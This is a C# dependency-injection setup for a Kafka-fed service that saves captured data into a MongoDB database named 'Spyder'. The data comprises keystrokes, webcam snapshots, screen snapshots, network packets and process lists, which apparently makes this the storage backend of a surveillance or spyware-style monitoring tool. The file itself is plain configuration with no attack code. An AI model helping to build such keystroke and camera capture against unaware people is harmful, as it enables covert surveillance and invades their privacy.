using Confluent.Kafka;
using Confluent.Kafka.Serialization;
using EMS.Infrastructure.DependencyInjection;
using EMS.Infrastructure.DependencyInjection.Interfaces;
using EMS.Infrastructure.Stream;
using EMS.Web.MongoSavers.Models;
using MongoDB.Driver;
using System.Collections.Generic;
using System.Reflection;
using System.Text;
using System.Threading;
using Easy.Common;
using Easy.Common.Interfaces;
using EMS.Core.Models.Mongo;
using EMS.Infrastructure.Statistics;
using EMS.Web.MongoSavers.Models.Savers;

namespace EMS.Web.MongoSavers.App_Start
{
    public class DependencyInjectionConfig
    {
        public void RegisterDependencies()
        {
            var injector = UnityInjector.Instance;

            this.RegisterCancellationToken(injector);
            this.RegisterKafkaProducer(injector);
            this.RegisterKafkaConsumer(injector);
            this.RegisterMongoCollections(injector);
            this.RegisterMongoSavers(injector);
            this.RegisterStatsCollector(injector);
            this.RegisterRestClient(injector);
        }

        private void RegisterRestClient(IInjector injector)
        {
            injector.RegisterInstance<IRestClient>(new RestClient());
        }

        private void RegisterStatsCollector(IInjector injector)
        {
            var serverName = "Home";
            var applicationName = "EMS.Web.MongoSavers";
            var producer = injector.Resolve<Producer<string, object>>();

            injector.RegisterInstance<IStatisticsCollector>(
                new KafkaStatisticsCollector(producer, applicationName, serverName));
        }

        private void RegisterCancellationToken(IInjector injector)
        {
            injector.RegisterInstance<CancellationToken>(new CancellationToken());
        }

        private void RegisterMongoCollections(IInjector injector)
        {
            var mongoClient = new MongoClient("mongodb://localhost:27017");
            var mongoDatabase = mongoClient.GetDatabase("Spyder");

            var networkPacketsCollection = mongoDatabase.GetCollection<CapturedNetworkPacketMongoDocument>(MongoCollections.NetworkPackets);
            var keyboardKeysCollection = mongoDatabase.GetCollection<CapturedKeyboardKeyMongoDocument>(MongoCollections.CapturedKeyboardKeys);
            var cameraSnapshotsCollection = mongoDatabase.GetCollection<CapturedCameraSnapshotMongoDocument>(MongoCollections.CameraSnapshots);
            var activeProcessesCollection = mongoDatabase.GetCollection<CapturedActiveProcessesMongoDocument>(MongoCollections.ActiveProcesses);
            var displaySnapshotsCollection = mongoDatabase.GetCollection<CapturedDisplaySnapshotMongoDocument>(MongoCollections.DisplaySnapshots);
            var foregroundProcessesCollection = mongoDatabase.GetCollection<CapturedForegroundProcessMongoDocument>(MongoCollections.ForegroundProcesses);

            injector.RegisterInstance<IMongoClient>(mongoClient);
            injector.RegisterInstance<IMongoDatabase>(mongoDatabase);
            injector.RegisterInstance<IMongoCollection<CapturedNetworkPacketMongoDocument>>(networkPacketsCollection);
            injector.RegisterInstance<IMongoCollection<CapturedKeyboardKeyMongoDocument>>(keyboardKeysCollection);
            injector.RegisterInstance<IMongoCollection<CapturedCameraSnapshotMongoDocument>>(cameraSnapshotsCollection);
            injector.RegisterInstance<IMongoCollection<CapturedActiveProcessesMongoDocument>>(activeProcessesCollection);
            injector.RegisterInstance<IMongoCollection<CapturedDisplaySnapshotMongoDocument>>(displaySnapshotsCollection);
            injector.RegisterInstance<IMongoCollection<CapturedForegroundProcessMongoDocument>>(foregroundProcessesCollection);
        }

        private void RegisterMongoSavers(IInjector injector)
        {
            injector
                .Register<IMongoSaver, KeyboardKeysSaver>(nameof(KeyboardKeysSaver))
                .Register<IMongoSaver, NetworkPacketsSaver>(nameof(NetworkPacketsSaver))
                .Register<IMongoSaver, CameraSnapshotsSaver>(nameof(CameraSnapshotsSaver))
                .Register<IMongoSaver, ActiveProcessesSaver>(nameof(ActiveProcessesSaver))
                .Register<IMongoSaver, DisplaySnapshotsSaver>(nameof(DisplaySnapshotsSaver))
                .Register<IMongoSaver, ForegroundProcessesSaver>(nameof(ForegroundProcessesSaver));
        }

        private void RegisterKafkaProducer(IInjector injector)
        {
            Producer<string, object> producer = GetKafkaProducerInstance();
            injector.RegisterInstance(producer);
        }

        private void RegisterKafkaConsumer(IInjector injector)
        {
            Consumer<string, string> consumer = GetKafkaConsumerInstance();
            injector.RegisterInstance(consumer);
        }

        public static Producer<string, object> GetKafkaProducerInstance()
        {
            var producerConfig = GetKafkaProducerConfiguration();
            var keySerializer = new StringSerializer(Encoding.UTF8);
            var valueSerializer = new JsonSerializerObjectToBytes();

            return new Producer<string, object>(
                producerConfig,
                keySerializer,
                valueSerializer);
        }

        public static Consumer<string, string> GetKafkaConsumerInstance()
        {
            var consumerConfig = GetKafkaConsumerConfiguration();
            var keyDeserializer = new StringDeserializer(Encoding.UTF8);
            var valueDeserializer = new JsonDeserializerBytesToString();

            return new Consumer<string, string>(
                consumerConfig,
                keyDeserializer,
                valueDeserializer);
        }

        public static Dictionary<string, object> GetKafkaConsumerConfiguration()
        {
            return new Dictionary<string, object>
            {
                { "group.id", "DefaultKafkaConsumer" },
                { "enable.auto.commit", false },
                { "auto.commit.interval.ms", 5000 },
                { "statistics.interval.ms", 60000 },
                { "bootstrap.servers", "localhost:9092" },
                { "default.topic.config", new Dictionary<string, object>()
                    {
                        { "auto.offset.reset", "smallest" }
                    }
                }
            };
        }

        public static Dictionary<string, object> GetKafkaProducerConfiguration()
        {
            return new Dictionary<string, object>
            {
                { "bootstrap.servers", "localhost:9092" }
            };
        }
    }
}